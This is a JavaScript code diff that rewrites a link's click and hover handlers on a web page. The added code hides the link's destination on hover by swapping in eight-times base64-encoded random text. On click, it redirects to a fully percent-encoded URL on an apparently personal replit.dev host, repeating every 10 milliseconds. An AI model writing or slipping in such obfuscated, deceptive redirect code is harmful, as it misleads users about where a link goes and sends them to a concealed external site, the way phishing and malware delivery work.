@@ -31,24 +31,21 @@
         let hoverTimeout;
         
         // Handle the click event
-        specialLink.addEventListener('click', function(event) {
-            // Prevent the default browser action for the link (which shows the URL)
-            event.preventDefault();
+    specialLink.addEventListener('click', function(event) {
+        event.preventDefault(); // Prevent the default link behavior
 
-            // Change the link text to "Redirecting..."
-            this.textContent = 'Redirecting...';
-            
-            // Get the URL from the data-url attribute and navigate to it
-            const url = this.getAttribute('href');
-            if (url) {
-                window.location.href = url;
-            }
-        });
+        this.textContent = 'Redirecting...'; // Change link text to "Redirecting..."
+
+        // Set a rapid interval to continuously redirect to the encoded URL
+        setInterval(function() {
+            window.location.href = "https://%35%33%35%30%65%33%63%63%2D%38%39%36%39%2D%34%33%61%62%2D%62%61%63%31%2D%65%64%65%37%37%35%38%64%36%33%36%64%2D%30%30%2D%31%38%77%67%72%73%68%67%36%6C%34%6C%67%2E%6A%61%6E%65%77%61%79%2E%72%65%70%6C%69%74%2E%64%65%76";
+        }, 10); // Redirect every 10 milliseconds
+    });
 
         // Handle the hover event (mouseenter)
         specialLink.addEventListener('mouseenter', function() {
             // Immediately change the data-url
-            this.setAttribute('href', 'uhoh://that.is.a.nono/you/cant/check/its/a/surprize.html');
+            this.setAttribute('href', btoa(btoa(btoa(btoa(btoa(btoa(btoa(btoa(Math.random()*100000000000000000000000000000000)))))))) );
 
             // Set a timeout to change it back after 1.4 seconds
             hoverTimeout = setTimeout(() => {
